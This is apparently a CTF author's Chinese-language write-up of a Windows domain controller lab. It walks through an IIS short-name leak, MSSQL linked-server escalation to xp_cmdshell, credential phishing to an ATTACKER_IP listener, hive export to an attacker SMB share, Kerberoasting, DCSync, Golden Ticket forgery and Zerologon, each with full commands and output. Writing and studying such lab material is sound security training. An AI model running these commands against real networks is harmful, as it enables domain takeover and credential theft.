---
title: Poloras-BabyDC-Documents
description: '个人出题-作者WriteUp'
pubDate: 2026-03-30
image: /game/Castlevania.png
categories:
  - Documentation
  - CTF
tags:
  - CTF
  - Windows Machine
---
![](/image/myself%20machine/Castlevania-Documents-1.png)

# Castlevania - Description
## 🦇 血色城堡的试炼
夜色如墨，雾气在古老的塔尖缭绕。  
在这片孤悬于暗影海上的废墟之上，**Baby_DC** 伫立着。城堡的石墙布满岁月的裂纹，残留的铭文仿佛低语着血与权力的秘密。  
传说，城堡的深处封印着至高无上的力量——**域控之主的遗产**。而唯有勇敢、狡黠且敏锐的猎人，才能步入这片黑暗迷宫。

你，是被命运选中的Ctfer。你手持智慧的鞭子，心怀猎魔者的冷冽与坚毅。你的任务，是沿着蛛丝般的漏洞链，一步步解锁城堡的秘密，最终夺取支配之力。

---

## 🔮 城堡探秘指南
| **<font style="color:rgb(13, 13, 13);">城堡区域</font>** | **<font style="color:rgb(13, 13, 13);">暗影线索</font>** | **<font style="color:rgb(13, 13, 13);">猎人行动</font>** |
| --- | --- | --- |
| **<font style="color:rgb(13, 13, 13);">前庭：破碎的彩窗</font>** | <font style="color:rgb(13, 13, 13);">IIS 的古老铭文残缺不全，短名如裂纹映出真实文件的轮廓</font> | <font style="color:rgb(13, 13, 13);">循着残存的光影，找到被隐藏的卷轴</font> |
| **<font style="color:rgb(13, 13, 13);">图书馆：尘封的藏书库</font>** | <font style="color:rgb(13, 13, 13);">MSSQL 的书架错位排列，Linked Server 的符文彼此共鸣</font> | <font style="color:rgb(13, 13, 13);">借由错误的多重咒文，踏入高阶的禁区</font> |
| **<font style="color:rgb(13, 13, 13);">地下水脉：沉睡的地道</font>** | <font style="color:rgb(13, 13, 13);">黑暗中回荡着隐秘的回声，服务之魂在隧道中低语</font> | <font style="color:rgb(13, 13, 13);">唤醒支配之力，挖掘幽深的隧道</font> |
| **<font style="color:rgb(13, 13, 13);">礼拜堂：幽魂的邮驿室</font>** | <font style="color:rgb(13, 13, 13);">邮箱如祭祀符文闪烁，信件承载着未被察觉的低语</font> | <font style="color:rgb(13, 13, 13);">欺瞒死神的信使，诱出被遗忘的名字与密语</font> |
| **<font style="color:rgb(13, 13, 13);">时钟塔：失序的混沌戒指</font>** | <font style="color:rgb(13, 13, 13);">Kerberos 的齿轮开始逆转，身份与时间失去秩序</font> | <font style="color:rgb(13, 13, 13);">双重咒印崩解，开启逆城的大门</font> |
| **<font style="color:rgb(13, 13, 13);">血色密室：禁忌的灵魂之匣</font>** | <font style="color:rgb(13, 13, 13);">Registry Hive 如封存灵魂的容器，机器的记忆在哭泣</font> | <font style="color:rgb(13, 13, 13);">窃取三份古文书，汲取魔王的暗影之力</font> |
| **<font style="color:rgb(13, 13, 13);">王座室：不灭的护身符</font>** | <font style="color:rgb(13, 13, 13);">域控之主的权柄凝结为黄金之证，欺骗身份与历史</font> | <font style="color:rgb(13, 13, 13);">铸造并注入黄金之证，坐上血红的王座</font> |
| **<font style="color:rgb(13, 13, 13);">终焉之间：血之圣杯</font>** | <font style="color:rgb(13, 13, 13);">Flag 是逆城的核心封印，亦是支配的终点</font> | <font style="color:rgb(13, 13, 13);">完成仪式，读取隐藏 Flag，城堡隐于月下</font> |


---

# Castlevania - Credentials
| 步骤 | 获取方式 | 凭据 | 用途 |
| --- | --- | --- | --- |
| 2 | IIS 8.3 短文件名 + fuzz | `wuwupor:lovlyBaby` | MSSQL 低权限登录 |
| 4 | SMTP欺骗 | `p2zhh:p2zhh_web` | 域用户，用于 Kerberos 查询 |
| 6 | Kerberoasting/AS-REP + hashcat | `mowen:1maxwell` | Backup Operators 成员 |
| 9 | 注册表 Hive → DCSync | `krbtgt:1e3c4fe72e1383c576b4b3aeef4730a8` | 伪造 Golden Ticket |
| 10 | Golden Ticket | `Administrator` (伪造) | 域管理员权限 |


---

# Castlevania - Attack Chain
```plain
[信息收集] nmap 端口扫描
      ↓
[Web渗透] IIS 8.3 短文件名泄露 → 定向 fuzz → 获取数据库凭据
      ↓
[数据库] MSSQL Linked Server 配置错误 → 低权限提升至 sa
      ↓
[命令执行] xp_cmdshell → 本地命令执行 (xmcve\sqlsvc)
      ↓
[内网探测] 发现 SMTP 邮件 → 获取域用户凭据 p2zhh
      ↓
[域渗透] Kerberoasting / AS-REP Roasting → 破解 mowen 密码
      ↓
[权限提升] Backup Operators → 导出注册表 Hive
      ↓
[域控接管] secretsdump 提取 krbtgt hash → Golden Ticket
      ↓
[最终目标] 域管理员权限 → 读取 Flag
```

---

# Castlevania - Write Up
[Bloodstained Ova](https://drive.google.com/file/d/1poq3Ova62UeME9bpjgvV-R8QEuT32NFW/view?usp=sharing)

[VirtualBox Version](https://download.virtualbox.org/virtualbox/7.2.0/VirtualBox-7.2.0-170228-Win.exe)

> **靶机信息**
>
> + IP: `192.168.0.xxx`（根据桥接网卡不同而改变）
> + 域名: `XMCVE.local`
> + 主机名: `CASTLEVANIA`
> + 操作系统: Windows Server 2019 (域控制器)
> + 难度: 中高
> + Flag 位置: `C:\Users\Administrator\Desktop\flag.txt`
>

---

## 第一步：信息收集
### 1.1 端口扫描
```bash
nmap -sT -sV -sC -p- --min-rate 5000 192.168.0.222 -oA scans/castlevania
```

**关键端口：**

| 端口 | 服务 | 版本/说明 |
| --- | --- | --- |
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | Microsoft IIS httpd 10.0 |
| 88 | Kerberos | 域控认证服务 |
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | NetBIOS Session |
| 389 | LDAP | AD LDAP (XMCVE.local) |
| 445 | SMB | SMBv3 (signing required) |
| 1433 | MSSQL | SQL Server 2016 SP2 |
| 3268 | LDAP GC | Global Catalog |


> **注意：** SMTP 端口 25 仅在靶机本地监听（`127.0.0.1:25`），外部 nmap 扫描不可见。需要通过 xp_cmdshell 在靶机内部发现。
>

**分析：** 目标同时运行 Web 服务、数据库和域控制器，属于单机 DC + 业务服务合一的架构。端口 88 和 389 表明这是一台域控制器，nmap 的 `ms-sql-ntlm-info` 脚本泄露域名 `XMCVE.local` 和主机名 `CASTLEVANIA`。

---

## 第二步：IIS 8.3 短文件名泄露
### 2.1 常规目录枚举
```bash
gobuster dir -u http://192.168.0.222/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

常规枚举无明显发现，页面仅显示 "Employee Portal - Under maintenance..."。

### 2.2 检测 8.3 短文件名漏洞
IIS 在 Windows 上默认启用 8.3 短文件名（NTFS 兼容特性）。可以利用 HTTP 响应差异来枚举短文件名。

```bash
# 使用 shortscan 工具
shortscan http://192.168.0.222/
```

**发现：**

```plain
[+] File: /POO_CO~1.TXT (Status: 200)
```

**原理：** Windows NTFS 会为长文件名自动生成 8.3 格式的短文件名。IIS 对存在和不存在的短文件名返回不同的 HTTP 状态码，攻击者可以逐字符枚举出短文件名。

### 2.3 定向 Fuzz 还原完整文件名
已知短文件名前缀为 `poo_co`，需要 fuzz 出完整文件名：

```bash
# 从字典中提取以 "co" 开头的单词
grep -i "^co" /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt > co_fuzz.txt

# 定向 fuzz
wfuzz -c -w co_fuzz.txt -u "http://192.168.0.222/poo_FUZZ.txt" --hc 404
```

**命中：**

```plain
000000XXX:   200   C=XXL   "connection"
```

完整文件名为 `poo_connection.txt`。

### 2.4 读取凭据文件
```bash
curl -s http://192.168.0.222/poo_connection.txt
```

**输出：**

```plain
server=localhost;
user=wuwupor;
password=lovlyBaby
database=master
```

**收获：** 获得 MSSQL 数据库凭据 `wuwupor:lovlyBaby`。

---

## 第三步：MSSQL Linked Server 提权
### 3.1 连接数据库
```bash
impacket-mssqlclient wuwupor:lovlyBaby@192.168.0.222
```

成功登录。

### 3.2 检查当前权限
```sql
SELECT SYSTEM_USER;
-- 输出: wuwupor

SELECT IS_SRVROLEMEMBER('sysadmin');
-- 输出: 0 (非 sysadmin，权限很低)
```

### 3.3 枚举 Linked Server
```sql
SELECT srvname FROM sysservers;
```

**输出：**

```plain
CASTLEVANIA
POO_CONFIG
POO_PUBLIC
```

发现名为 `POO_CONFIG和POO_PUBLIC` 的 Linked Server。

### 3.4 通过 Linked Server 提权
```sql
-- 检查通过 Linked Server 执行时的身份
EXEC ('EXEC (''SELECT SUSER_NAME();'') AT [POO_PUBLIC]') AT [POO_CONFIG];
```

**输出：**

```plain
sa
```

**关键发现！** Linked Server `POO_CONFIG` 配置错误，将所有登录映射到 `sa` 账户。这意味着低权限的 `wuwupor` 可以通过 Linked Server 以 `sa` 身份执行任意 SQL 命令。

### 3.5 通过 xp_cmdshell 获取命令执行
```sql
-- 通过 Linked Server 以 sa 身份执行系统命令
EXEC ('EXEC (''xp_cmdshell ''''whoami'''' '') AT [POO_PUBLIC]') AT [POO_CONFIG];
```

**输出：**

```plain
xmcve\sqlsvc
```

成功获得操作系统命令执行权限，当前身份为域用户 `xmcve\sqlsvc`。

---

## 第四步：SMTP 钓鱼攻击 - 获取域用户凭据
### 4.1 发现 SMTP 服务
```sql
EXEC ('EXEC (''xp_cmdshell ''''netstat -ano ^| findstr LISTENING'''' '') AT [POO_PUBLIC]') AT [POO_CONFIG];
```

发现 25 端口（SMTP）正在监听。

### 4.2 在 Kali 上启动监听器
```bash
# 方法一：简单 nc（每次只捕获一个 POST，需重复）
nc -lnvp 80

# 方法二：Python 持久监听（推荐，可捕获所有 POST）
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get('Content-Length',0))).decode()
        print(f'[+] {body}')
        self.send_response(200); self.end_headers(); self.wfile.write(b'OK')
    def log_message(self,*a): pass
HTTPServer(('0.0.0.0',80),H).serve_forever()
"
```

### 4.3 SMTP-钓鱼邮件
> **注意：** 考点在于swaks邮件欺骗，SMTP 端口 25 仅在靶机本地监听，外部无法直接访问。攻击者可以通过代理转发进行swaks欺骗，也可以通过已获得的 xp_cmdshell 在靶机本地发送邮件
>

```sql
-- 通过 Linked Server 以 sa 身份，利用 xp_cmdshell 调用 PowerShell 发送邮件
EXEC ('EXEC (''xp_cmdshell ''''powershell -Command "Send-MailMessage -To xxxxxx@XMCVE.local -From xxxxxx@XMCVE.local -Subject test -Body http://ATTACKER_IP/ -SmtpServer 127.0.0.1"'''' '') AT [POO_PUBLIC]') AT [POO_CONFIG];
```

[http://ATTACKER_IP/](http://ATTACKER_IP/)  这里替换为监听端口的ip地址

```sql
swaks ----from xxxxxx@XMCVE.local --body "citrix http://ATTACKER_IP/" --server $_IP
```

推荐使用kali工具swaks进行欺骗枚举

> **替换说明：**
>
> + `ATTACKER_IP`: 你的 Kali IP（如 192.168.0.108）
> + 邮件正文只需包含 URL，Bot 会自动提取并访问
>

### 4.4 捕获凭据
靶机上有邮件处理机器人，会模拟用户点击邮件中的链接并提交登录凭据。在 nc 监听器上会陆续收到多个 POST 请求：

```plain
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] XXXXX
POST /remote/auth/login.aspx HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
Host: ATTACKER_IP

LoginType=Explicit&user=pr3d1ct&password=yuyan_crypto&domain=XMCVE.LOCAL
```

> **注意：** 每次只能捕获一个 POST（nc 收到后会断开）。需要重复发送钓鱼邮件并重启 nc 监听，共捕获 4 组凭据：
>

| 用户名 | 密码 | 说明 |
| --- | --- | --- |
| pr3d1ct | yuyan_crypto | 噪声账户（非域用户） |
| **p2zhh** | **p2zhh_web** | **有效域用户 ← 关键** |
| aomr | aomr_reverse | 噪声账户（非域用户） |
| berial | berial_pwn | 噪声账户（非域用户） |


**原理：** 这是一个经典的钓鱼攻击场景。攻击者发送包含恶意 URL 的邮件，目标用户点击链接后会被重定向到攻击者控制的假登录页面，输入的凭据被攻击者捕获。

将所有用户名保存到 `users.txt`，密码保存到 `passwd.txt`，用于下一步验证。

**收获：** 获得多组用户名密码，其中 `p2zhh:p2zhh_web` 是关键。

---

## 第五步：域用户验证
### 5.1 Kerbrute 用户枚举
将邮件中的用户名保存到 `users.txt`：

```plain
pr3d1ct
aomr
p2zhh
berial
```

```bash
kerbrute userenum -d XMCVE.local users.txt --dc 192.168.0.222
```

确认 `p2zhh` 为有效域用户。

### 5.2 CrackMapExec 验证凭据
```bash
crackmapexec smb 192.168.0.222 -u p2zhh -p p2zhh_web
```

**输出：**

```plain
SMB  192.168.0.222  445  CASTLEVANIA  [+] XMCVE.local\p2zhh:p2zhh_web
```

凭据有效，`p2zhh` 是一个合法的域用户。

---

## 第六步：Kerberoasting / AS-REP Roasting
### 6.1 Kerberoasting（路径 A）
利用 `p2zhh` 的域用户身份查询设置了 SPN 的账户：

```bash
impacket-GetUserSPNs XMCVE.local/p2zhh:p2zhh_web -dc-ip 192.168.0.222 -request
```

**输出：**

```plain
ServicePrincipalName                    Name    MemberOf
--------------------------------------  ------  --------------------------------
HTTP/CASTLEVANIA.XMCVE.local            mowen   CN=Backup Operators,CN=Builtin,...

$krb5tgs$23$*mowen$XMCVE.LOCAL$HTTP/CASTLEVANIA.XMCVE.local*$...
```

**关键发现：**

1. 用户 `mowen` 设置了 SPN，可以进行 Kerberoasting
2. `mowen` 是 **Backup Operators** 组成员（这在后续步骤中非常重要）

### 6.2 AS-REP Roasting（路径 B）
```bash
impacket-GetNPUsers XMCVE.local/ -dc-ip 192.168.0.222 -usersfile users.txt -no-pass
```

**输出：**

```plain
$krb5asrep$23$mowen@XMCVE.LOCAL:...
```

`mowen` 账户设置了 "不需要 Kerberos 预认证"（DoesNotRequirePreAuth），可以直接获取 AS-REP hash。

### 6.3 离线破解
```bash
# Kerberoasting hash (TGS-REP, mode 13100)
hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt

# 或 AS-REP hash (mode 18200)
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

**破解结果：**

```plain
mowen:1maxwell
```

---

## 第七步：域枚举 - 确认 Backup Operators
### 7.1 LDAP 信息收集
```bash
ldapdomaindump -u 'XMCVE.local\mowen' -p '1maxwell' 192.168.0.222
```

查看生成的 HTML/JSON 文件，确认 `mowen` 的组成员关系：

```plain
MemberOf: CN=Backup Operators,CN=Builtin,DC=XMCVE,DC=local
```

**分析：** Backup Operators 组成员拥有备份系统文件的特权，包括读取注册表 Hive（SAM、SYSTEM、SECURITY），这些 Hive 中包含域内所有账户的哈希值。

---

## 第八步：Backup Operators 权限利用
### 方法一
#### 8.1 启动攻击机 SMB 共享
在 Kali 上启动一个 SMB 共享，用于接收导出的注册表文件：

```bash
mkdir /tmp/share
impacket-smbserver -smb2support share /tmp/share
```

#### 8.2 远程注册表备份
利用 `mowen` 的 Backup Operators 权限，远程导出注册表 Hive：

```bash
# 方法一：直接导出到攻击机 SMB 共享（需要靶机出站 445 可达）
impacket-reg XMCVE.local/mowen:1maxwell@192.168.0.222 backup -o \\<ATTACKER_IP>\share

# 方法二：导出到靶机本地路径（推荐，避免出站 SMB 被防火墙拦截）
impacket-reg XMCVE.local/mowen:1maxwell@192.168.0.222 backup -o 'C:\Windows\Temp\hives'
```

> **注意：** 如果方法一报 `ERROR_PATH_NOT_FOUND`，说明靶机无法访问攻击机的 SMB 共享（出站 445 被阻断）。使用方法二将 Hive 保存到靶机本地，再通过 smbclient 下载：
>
> 如果 C$ 也无权限，可通过其他已有的命令执行通道（如 xp_cmdshell）将文件拷贝到可访问的位置。
>

```plain
smbclient '//192.168.0.222/C$' -U 'XMCVE/mowen%1maxwell' -c 'mkdir Windows\Temp\hives'
```

```bash
smbclient '//192.168.0.222/C$' -U 'XMCVE/mowen%1maxwell' -c 'cd Windows\Temp\hives; get SAM.save; get SYSTEM.save; get SECURITY.save'
```

**生成文件：**

```plain
SAM.save      (24 KB)
SYSTEM.save   (15 MB)
SECURITY.save (40 KB)
```

**原理：** Backup Operators 组成员拥有 `SeBackupPrivilege`，允许读取系统上任何文件，包括受保护的注册表 Hive。`impacket-reg` 通过远程注册表服务（RemoteRegistry）执行 `RegSaveKey` 操作，将 Hive 导出到指定路径。

### 方法二
#### IIS存储
```bash
impacket-reg XMCVE.local/mowen:1maxwell@192.168.0.222 backup -o 'C:\inetpub\wwwroot'
```

浏览器访问（iis默认配置不可以访问save文件，管理员已对iis配置文件进行了修改）

---

## 第九步：提取 krbtgt Hash
### 离线解析 Hive
```bash
impacket-secretsdump -system /tmp/share/SYSTEM.save -security /tmp/share/SECURITY.save -sam /tmp/share/SAM.save LOCAL
```

**输出（关键部分）：**

```plain
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:85ef092d9016422943e90d8a9dd7be0d

[*] DefaultPassword
(Unknown User):jU@Li&us@!#!

[*] _SC_MSSQLSERVER
(Unknown User):Sql!2026
```

**关键发现：** `$MACHINE.ACC` 是域控的机器账户（`CASTLEVANIA$`）NTLM hash。在域控上，机器账户拥有 DCSync 权限，可以用它提取 `krbtgt` hash。

## 第十步：黄金票据伪造
### 利用机器账户 DCSync 提取 krbtgt
```bash
impacket-secretsdump -hashes 'aad3b435b51404eeaad3b435b51404ee:85ef092d9016422943e90d8a9dd7be0d' \
    'XMCVE.local/CASTLEVANIA$@CASTLEVANIA.XMCVE.local' \
    -just-dc-user krbtgt -target-ip 192.168.0.222
```

**输出：**

```plain
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1e3c4fe72e1383c576b4b3aeef4730a8:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:2392ad160e585e1448c5ca4623b9ad48789c267c6488a0074dd86e98457fb5fc
krbtgt:aes128-cts-hmac-sha1-96:7d55d129c8fe6c50aa87cb542775f0a0
krbtgt:des-cbc-md5:e570376eb538c132
```

**收获：** 成功提取 `krbtgt` 账户的 NTLM hash `1e3c4fe72e1383c576b4b3aeef4730a8`。这是域中最关键的密钥，拥有它就可以伪造任意 Kerberos 票据。

---

### 获取域 SID
```bash
impacket-lookupsid XMCVE.local/mowen:1maxwell@192.168.0.222
```

**输出：**

```plain
[*] Domain SID is: S-1-5-21-805392858-1149987238-1076533053
```

### 伪造 Golden Ticket
```bash
impacket-ticketer \
    -nthash 1e3c4fe72e1383c576b4b3aeef4730a8 \
    -domain-sid S-1-5-21-805392858-1149987238-1076533053 \
    -domain XMCVE.local \
    Administrator
```

**输出：**

```plain
[*] Creating basic skeleton ticket and target PAC
[*] Customizing ticket for XMCVE.local/Administrator
[*] PAC_LOGON_INFO
[*] EncTicketPart
[*] EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

### 注入票据
```bash
export KRB5CCNAME=Administrator.ccache
```

确认票据已加载：

```bash
klist
```

**输出：**

```plain
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@XMCVE.LOCAL

Valid starting       Expires              Service principal
XX/XX/XXXX XX:XX:XX  XX/XX/XXXX XX:XX:XX  krbtgt/XMCVE.LOCAL@XMCVE.LOCAL
```

### 配置 Kerberos 认证
确保 `/etc/krb5.conf` 包含正确的域配置：

```properties
[libdefaults]
    default_realm = XMCVE.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    XMCVE.LOCAL = {
        kdc = 192.168.0.222
        admin_server = 192.168.0.222
    }

[domain_realm]
    .xmcve.local = XMCVE.LOCAL
    xmcve.local = XMCVE.LOCAL
```

同时确保 `/etc/hosts` 中有正确的解析：

```plain
192.168.0.222    CASTLEVANIA.XMCVE.local CASTLEVANIA
```

### 使用 Golden Ticket 获取域管 Shell
```bash
# 方法一：psexec（获取交互式 SYSTEM shell）
impacket-psexec XMCVE.local/Administrator@CASTLEVANIA.XMCVE.local -k -no-pass -target-ip 192.168.0.222

# 方法二：wmiexec（直接执行命令，更隐蔽）
impacket-wmiexec XMCVE.local/Administrator@CASTLEVANIA.XMCVE.local -k -no-pass -target-ip 192.168.0.222 -codec gbk "type C:\Users\Administrator\Desktop\flag.txt"
```

**wmiexec 输出：**

```plain
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
FLAG{XMCVE_Castlevania_Bloodlines_DA_Pwned}
```

成功以域管理员身份执行命令。

---

### 获取 Flag（已删除）
```plain
type C:\Users\Administrator\Desktop\flag.txt
```

**输出：**

```plain
FLAG{XMCVE_Castlevania_Bloodlines_DA_Pwned}
```

---

# Castlevania - Unexpected
> 第一次出靶机题，经验有限不尽人意之处请多海涵，观看选手wp也学到了很多
>
> 下列四种非预期解法均取自本次比赛选手的wp中
>

## <font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font>
> <font style="color:rgb(79, 79, 79);">CVSS满分漏洞，被称为域内永恒之蓝</font>
>
> <font style="color:rgb(79, 79, 79);">靶机搭建环境选自互联网中windows server2019镜像.....出题的时候没往这块想</font>
>
> <font style="color:rgb(79, 79, 79);">出乎我的意料了......当看到选手的wp令我很惊讶</font>
>
> <font style="color:rgb(79, 79, 79);">八名选手采用该方法解出题目</font>
>

### <font style="color:rgb(51, 51, 51);">影响系统版本</font>
<font style="color:rgb(51, 51, 51);">Windows Server 2008 R2 for x64-based Systems Service Pack 1  
</font><font style="color:rgb(51, 51, 51);">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)  
</font><font style="color:rgb(51, 51, 51);">Windows Server 2012  
</font><font style="color:rgb(51, 51, 51);">Windows Server 2012 (Server Core installation)  
</font><font style="color:rgb(51, 51, 51);">Windows Server 2012 R2  
</font><font style="color:rgb(51, 51, 51);">Windows Server 2012 R2 (Server Core installation)  
</font><font style="color:rgb(51, 51, 51);">Windows Server 2016  
</font><font style="color:rgb(51, 51, 51);">Windows Server 2016 (Server Core installation)  
</font><font style="color:rgb(51, 51, 51);">Windows Server 2019  
</font><font style="color:rgb(51, 51, 51);">Windows Server 2019 (Server Core installation)  
</font><font style="color:rgb(51, 51, 51);">Windows Server, version 1903 (Server Core installation)  
</font><font style="color:rgb(51, 51, 51);">Windows Server, version 1909 (Server Core installation)  
</font><font style="color:rgb(51, 51, 51);">Windows Server, version 2004 (Server Core installation)</font>

### <font style="color:rgb(51, 51, 51);">利用方法</font>
#### 手法一：msfconsole
##### <font style="color:rgb(51, 51, 51);">1. </font>ZeroLogon 
```plain
$ crackmapexec smb 192.168.40.132 -u '' -p '' -M zerologon

ZEROLOGO...  192.168.40.132  445  CASTLEVANIA  VULNERABLE

msf6> use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
msf6> set RHOSTS 192.168.40.132
msf6> set NBNAME CASTLEVANIA
msf6> run

[+] 192.168.40.132:49668 - Successfully authenticated
[+] 192.168.40.132:49668 - Successfully set the machine account (CASTLEVANIA$) password to:
    aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
```

---

##### <font style="color:rgb(51, 51, 51);">2. </font>DCSync 
```plain
$ impacket-secretsdump -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' \
   -just-dc 'XMCVE.local/CASTLEVANIA$'@192.168.40.132

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1e3c4fe72e1383c576b4b3aeef4730a8:::
Alucard:1000:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
XMCVE.local\p2zhh:1104:aad3b435b51404eeaad3b435b51404ee:bc2bf43119e258bcecf71d44abc29db7:::
XMCVE.local\mowen:1105:aad3b435b51404eeaad3b435b51404ee:efb5fa49a38497a71e144f690860688e:::
```

#### 手法二：python脚本
##### <font style="color:rgb(51, 51, 51);">1. </font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font>
![](/image/myself%20machine/Castlevania-Documents-2.jpeg)

##### <font style="color:rgb(51, 51, 51);">2. </font>hash dump
<font style="color:#333333;">利用成功，接下来dump域内所有用户的哈希</font>

![](/image/myself%20machine/Castlevania-Documents-3.jpeg)

## <font style="color:#333333;">本地挂载</font><font style="color:rgb(51, 51, 51);"></font>
> 当初为了预防选手将靶机当取证来做故将flag抹去，当看到wp令我意外.....
>
> 并且还没办法修，无论是ntds.dit还是Hive删掉都会直接影响系统运行
>
> 俩名选手采用该方法解出题目
>

### 方法一：挂载kali
#### <font style="color:rgb(51, 51, 51);">1. </font>挂载硬盘并提取 NTDS 数据库
将 Windows 域控的虚拟硬盘挂载到 Kali Linux，复制 AD 数据库文件：

>  `ntds.dit`：Active Directory 数据库，存储所有域用户的凭据 Hash  
- `SYSTEM`：注册表 Hive，包含解密 ntds.dit 所需的 BootKey
>

```plain
sudo cp /mnt/win/Windows/NTDS/ntds.dit ~/Desktop/
sudo cp /mnt/win/Windows/System32/config/SYSTEM ~/Desktop/
```

#### <font style="color:rgb(51, 51, 51);">2. </font>离线提取域用户 Hash
使用 `impacket-secretsdump` 离线解密 ntds.dit：

> 关键发现：Administrator 与 Alucard 共享同一个 NT Hash，多个普通用户也共享同一个 Hash，说明存在弱密码策略。
>

```plain
sudo impacket-secretsdump -ntds ~/Desktop/ntds.dit -system ~/Desktop/SYSTEM LOCAL
```

| 成功提取所有域用户的 NT Hash：   Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::   Alucard:1000:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::   XMCVE.local\p2zhh:1104:::bc2bf43119e258bcecf71d44abc29db7:::   XMCVE.local\mowen:1105:::efb5fa49a38497a71e144f690860688e:::   XMCVE.local\sales/support/it/hr/admin:共享 hash 2b576acbe6bcfda7294d6bd18041b8fe   XMCVE.local\sqlsvc:1112:::d93ef04edb808c5bce3a5bd67b936ca9::: |
| :--- |


### 方法二：<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">OVA分解挂盘</font>
#### <font style="color:rgb(51, 51, 51);">1. </font><font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">VBoxManage</font>
<font style="color:rgb(51, 51, 51);">本地没有直接可用的官方 VirtualBox 7.2.0 图形界面环境，所以我直接用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">VBoxManage.exe</font>`<font style="color:rgb(51, 51, 51);"> 做手工导入和挂盘。</font>

<font style="color:rgb(51, 51, 51);">处理方式不是直接 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">VBoxManage import</font>`<font style="color:rgb(51, 51, 51);">，而是：</font>

1. <font style="color:rgb(51, 51, 51);">从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ova</font>`<font style="color:rgb(51, 51, 51);"> 解出 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ovf</font>`<font style="color:rgb(51, 51, 51);"> 和 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained 1-disk001.vmdk</font>`
2. <font style="color:rgb(51, 51, 51);">把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">streamOptimized</font>`<font style="color:rgb(51, 51, 51);"> 的 VMDK 转成可直接挂载的 VDI</font>
3. <font style="color:rgb(51, 51, 51);">手工创建 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Windows2019_64</font>`<font style="color:rgb(51, 51, 51);"> 虚拟机并挂盘</font>
4. <font style="color:rgb(51, 51, 51);">配置 NAT 端口转发</font>

#### <font style="color:rgb(51, 51, 51);">2. </font>离线导出
<font style="color:rgb(51, 51, 51);">离线链路，从 VMDK 里直接导出关键文件：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/NTDS/ntds.dit</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/System32/config/SYSTEM</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/System32/config/SECURITY</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/inetpub/wwwroot</font>`

#### <font style="color:rgb(51, 51, 51);">3. 域控凭据</font>
<font style="color:rgb(51, 51, 51);">对离线导出的三件套执行：</font>

```plain
python secretsdump.py -system offline/hives/SYSTEM \
  -security offline/hives/SECURITY \
  -ntds offline/hives/ntds.dit LOCAL
```

#### 利用脚本
```plain
import argparse
import os
import random
import re
import shutil
import string
import subprocess
import sys
import time
from pathlib import Path

from impacket.dcerpc.v5 import scmr, transport


ROOT = Path(__file__).resolve().parent
VM_NAME = "Bloodstained"
DEFAULT_OVA = ROOT / "Bloodstained.ova"
DEFAULT_OVF = ROOT / "Bloodstained.ovf"
DEFAULT_VMDK = ROOT / "Bloodstained 1-disk001.vmdk"
DEFAULT_VM_DIR = ROOT / "vm" / VM_NAME
DEFAULT_VDI = DEFAULT_VM_DIR / f"{VM_NAME}.vdi"
DEFAULT_VBOX_HOME = ROOT / ".vboxhome"
